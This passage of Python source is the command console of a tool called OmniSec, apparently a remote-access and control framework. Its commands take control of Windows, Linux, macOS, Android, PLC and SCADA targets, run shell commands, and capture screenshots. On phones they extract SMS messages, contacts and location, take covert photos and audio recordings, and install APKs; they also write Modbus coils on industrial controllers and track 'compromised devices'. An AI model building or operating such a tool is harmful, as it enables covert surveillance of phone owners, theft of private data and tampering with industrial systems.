            result = self.remote_control.control_pc_windows(target, port or 4444)
        elif platform == "linux":
            result = self.remote_control.control_pc_linux(target, port or 22)
        elif platform == "macos":
            result = self.remote_control.control_pc_macos(target, port or 22)
        elif platform == "android":
            result = self.remote_control.control_android(target, port or 5555)
        elif platform == "plc":
            result = self.remote_control.control_plc_modbus(target, port or 502)
        elif platform == "scada":
            result = self.remote_control.control_scada_dnp3(target, port or 20000)
        else:
            print(f"{Fore.RED}Unknown platform{Style.RESET_ALL}")
            return
        
        if result and result.get("success"):
            print(f"{Fore.GREEN}[+] Control established!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Capabilities: {', '.join(result.get('capabilities', []))}{Style.RESET_ALL}")
            self.current_session = target
        else:
            print(f"{Fore.RED}[-] Failed to establish control{Style.RESET_ALL}")
            if result and "error" in result:
                print(f"{Fore.RED}Error: {result['error']}{Style.RESET_ALL}")
    
    def do_shell(self, arg):
        """
        Execute shell command on target
        Usage: shell <command>
        Example: shell whoami
        """
        if not self.current_session:
            print(f"{Fore.RED}No active session{Style.RESET_ALL}")
            return
        
        if not arg:
            print(f"{Fore.RED}Usage: shell <command>{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Executing: {arg}{Style.RESET_ALL}")
        
        # Execute command based on platform
        target = self.current_session
        if target in self.remote_control.active_sessions:
            session = self.remote_control.active_sessions[target]
            platform = session.get("platform", "")
            
            if platform == "Android":
                output = self.remote_control.android_shell_command(target, arg)
                print(f"{Fore.YELLOW}{output}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}Command execution for {platform} not yet implemented{Style.RESET_ALL}")
    
    def do_screenshot(self, arg):
        """
        Capture screenshot from target
        Usage: screenshot [target]
        """
        target = arg if arg else self.current_session
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Capturing screenshot from {target}...{Style.RESET_ALL}")
        
        frame = self.remote_control.get_stream_frame(target)
        if frame:
            filename = f"screenshot_{target}_{int(time.time())}.png"
            with open(filename, 'wb') as f:
                f.write(frame)
            print(f"{Fore.GREEN}[+] Screenshot saved: {filename}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] No stream available{Style.RESET_ALL}")
    
    def do_stream(self, arg):
        """
        Start/stop screen streaming
        Usage: stream <start|stop> [target]
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: stream <start|stop> [target]{Style.RESET_ALL}")
            return
        
        action = args[0]
        target = args[1] if len(args) > 1 else self.current_session
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        if action == "start":
            print(f"{Fore.GREEN}[+] Streaming started for {target}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Use 'screenshot' command to capture frames{Style.RESET_ALL}")
        elif action == "stop":
            print(f"{Fore.YELLOW}[*] Streaming stopped for {target}{Style.RESET_ALL}")
    
    def do_android(self, arg):
        """
        Android-specific commands
        Usage: android <command> [args]
        Commands: sms, contacts, location, photo, audio, install, pull, push
        Example: android sms
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: android <command> [args]{Style.RESET_ALL}")
            return
        
        command = args[0]
        target = self.current_session
        
        if not target:
            print(f"{Fore.RED}No active Android session{Style.RESET_ALL}")
            return
        
        if command == "sms":
            print(f"{Fore.CYAN}[*] Extracting SMS messages...{Style.RESET_ALL}")
            sms = self.remote_control.android_get_sms(target)
            print(f"{Fore.GREEN}[+] Retrieved {len(sms)} SMS messages{Style.RESET_ALL}")
        
        elif command == "contacts":
            print(f"{Fore.CYAN}[*] Extracting contacts...{Style.RESET_ALL}")
            contacts = self.remote_control.android_get_contacts(target)
            print(f"{Fore.GREEN}[+] Retrieved {len(contacts)} contacts{Style.RESET_ALL}")
        
        elif command == "location":
            print(f"{Fore.CYAN}[*] Getting device location...{Style.RESET_ALL}")
            location = self.remote_control.android_get_location(target)
            print(f"{Fore.YELLOW}{json.dumps(location, indent=2)}{Style.RESET_ALL}")
        
        elif command == "photo":
            print(f"{Fore.CYAN}[*] Taking photo...{Style.RESET_ALL}")
            photo = self.remote_control.android_take_photo(target)
            print(f"{Fore.GREEN}[+] Photo saved: {photo}{Style.RESET_ALL}")
        
        elif command == "audio":
            duration = int(args[1]) if len(args) > 1 else 10
            print(f"{Fore.CYAN}[*] Recording audio for {duration} seconds...{Style.RESET_ALL}")
            audio = self.remote_control.android_record_audio(target, duration)
            print(f"{Fore.GREEN}[+] Audio saved: {audio}{Style.RESET_ALL}")
        
        elif command == "install":
            if len(args) < 2:
                print(f"{Fore.RED}Usage: android install <apk_path>{Style.RESET_ALL}")
                return
            result = self.remote_control.android_install_app(target, args[1])
            if result["success"]:
                print(f"{Fore.GREEN}[+] APK installed successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Installation failed{Style.RESET_ALL}")
        
        elif command == "pull":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: android pull <remote_path> <local_path>{Style.RESET_ALL}")
                return
            result = self.remote_control.android_pull_file(target, args[1], args[2])
            if result["success"]:
                print(f"{Fore.GREEN}[+] File pulled successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Pull failed{Style.RESET_ALL}")
        
        elif command == "push":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: android push <local_path> <remote_path>{Style.RESET_ALL}")
                return
            result = self.remote_control.android_push_file(target, args[1], args[2])
            if result["success"]:
                print(f"{Fore.GREEN}[+] File pushed successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Push failed{Style.RESET_ALL}")
    
    def do_plc(self, arg):
        """
        PLC/Industrial control commands
        Usage: plc <command> [args]
        Commands: read, write, status
        Example: plc read 0 10
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: plc <command> [args]{Style.RESET_ALL}")
            return
        
        command = args[0]
        target = self.current_session
        
        if not target:
            print(f"{Fore.RED}No active PLC session{Style.RESET_ALL}")
            return
        
        if command == "read":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: plc read <address> <count>{Style.RESET_ALL}")
                return
            address = int(args[1])
            count = int(args[2])
            result = self.remote_control.modbus_read_coils(target, address, count)
            if result["success"]:
                print(f"{Fore.GREEN}[+] Data: {result['data']}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Read failed{Style.RESET_ALL}")
        
        elif command == "write":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: plc write <address> <value>{Style.RESET_ALL}")
                return
            address = int(args[1])
            value = args[2].lower() == "true"
            result = self.remote_control.modbus_write_coil(target, address, value)
            if result["success"]:
                print(f"{Fore.GREEN}[+] Write successful{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Write failed{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # SESSION MANAGEMENT
    # ═══════════════════════════════════════════════════════════════════
    
    def do_sessions(self, arg):
        """
        List or interact with sessions
        Usage: sessions [list|use|kill] [session_id]
        """
        args = arg.split()
        
        if not args or args[0] == "list":
            sessions = self.remote_control.list_sessions()
            print(f"\n{Fore.CYAN}Active Sessions:{Style.RESET_ALL}")
            for i, session in enumerate(sessions, 1):
                active = " *" if session['target'] == self.current_session else ""
                print(f"  {i}. {Fore.GREEN}[{session['target']}]{Style.RESET_ALL} "
                      f"Platform: {session['platform']} | "
                      f"Streaming: {session['streaming']}{active}")
        
        elif args[0] == "use":
            if len(args) < 2:
                print(f"{Fore.RED}Usage: sessions use <target>{Style.RESET_ALL}")
                return
            self.current_session = args[1]
            print(f"{Fore.GREEN}[+] Switched to session: {args[1]}{Style.RESET_ALL}")
        
        elif args[0] == "kill":
            if len(args) < 2:
                print(f"{Fore.RED}Usage: sessions kill <target>{Style.RESET_ALL}")
                return
            result = self.remote_control.close_session(args[1])
            if result["success"]:
                print(f"{Fore.GREEN}[+] Session closed{Style.RESET_ALL}")
                if self.current_session == args[1]:
                    self.current_session = None
            else:
                print(f"{Fore.RED}[-] Failed to close session{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # UTILITY COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_export(self, arg):
        """
        Export scan results
        Usage: export [filename]
        """
        filename = arg if arg else f"scan_{int(time.time())}.json"
        self.scanner.export_results(filename)
    
    def do_clear(self, arg):
        """Clear screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def do_status(self, arg):
        """Show system status"""
        print(f"\n{Fore.CYAN}═══ OMNISEC STATUS ═══{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Discovered Devices: {len(self.discovered_devices)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Compromised Devices: {len(self.compromised_devices)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Active Sessions: {len(self.remote_control.active_sessions)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Current Target: {self.current_target or 'None'}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Current Session: {self.current_session or 'None'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}═══════════════════════{Style.RESET_ALL}\n")
    
    def do_exit(self, arg):
        """Exit command center"""
        print(f"{Fore.YELLOW}[*] Closing all sessions...{Style.RESET_ALL}")
        for target in list(self.remote_control.active_sessions.keys()):
            self.remote_control.close_session(target)
        print(f"{Fore.GREEN}[+] Goodbye!{Style.RESET_ALL}")
        return True
    
    def do_quit(self, arg):
        """Exit command center"""
        return self.do_exit(arg)
    
    def do_EOF(self, arg):
        """Exit on Ctrl+D"""
        print()
        return self.do_exit(arg)


def main():
    """Main entry point"""
    try:
        center = OmniSecCommandCenter()
        center.cmdloop()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
